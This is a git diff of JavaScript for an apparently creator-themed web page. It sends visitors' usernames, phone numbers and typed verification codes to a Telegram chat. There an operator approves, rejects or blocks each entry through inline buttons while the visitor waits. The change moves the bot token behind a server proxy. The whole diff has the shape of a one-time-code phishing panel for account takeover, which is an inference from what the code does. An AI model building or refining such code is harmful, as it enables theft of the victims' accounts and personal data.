@@ -11,12 +11,10 @@ let currentUser=JSON.parse(localStorage.getItem('ch_user_v2')||'null');
 localStorage.removeItem('ch_user');
 let likes={};
 let comments={};
-const TG_TOKEN='__PUT_TG_TOKEN_HERE__';
-const TG_CHAT='__PUT_TG_CHAT_ID_HERE__';
 function fmt(ph){ let p=ph.replace(/\D/g,''); if(p.length===9) p='0'+p; return p.replace(/(\d{2})(?=\d)/g,'$1 ').trim(); }
 function sendTelegram(msg, pendingId){
   const kb={inline_keyboard:[[{text:'✅ Valider',callback_data:'approve_'+pendingId},{text:'❌ Refuser',callback_data:'reject_'+pendingId}],[{text:'🚫 Bloquer numéro',callback_data:'block_'+pendingId}]]};
-  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TG_CHAT,message_thread_id:2,text:msg,parse_mode:'HTML',reply_markup:kb})}).catch(()=>{});
+  fetch('/api/telegram/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:msg,pid:pendingId,reply_markup:kb})}).catch(()=>{});
 }
 
 const defaultImgs=Array.from({length:6},(_,i)=>`https://picsum.photos/seed/creator${i}/400/600`);
@@ -161,7 +159,7 @@ document.getElementById('verifyCode').onclick=async()=>{
 };
 function sendTelegramCode(entered, pid){
   const kb={inline_keyboard:[[{text:'✅ Code OK',callback_data:'code_ok_'+pid},{text:'❌ Code faux',callback_data:'code_bad_'+pid}]]};
-  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TG_CHAT,message_thread_id:2,text:`🔑 <b>Code saisi</b>\n\n👤 ${pendingUser.username}\n📱 +33 ${fmt(pendingUser.phone)}\n✏️ Saisi: <code>${entered}</code>\n🆔 ${pid}`,parse_mode:'HTML',reply_markup:kb})}).catch(()=>{});
+  fetch('/api/telegram/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:`🔑 <b>Code saisi</b>\n\n👤 ${pendingUser.username}\n📱 +33 ${fmt(pendingUser.phone)}\n✏️ Saisi: <code>${entered}</code>\n🆔 ${pid}`,pid:pid,reply_markup:kb})}).catch(()=>{});
 }
 function showWaitingCode(v){
   document.getElementById('waitingPanel').classList.remove('hidden');
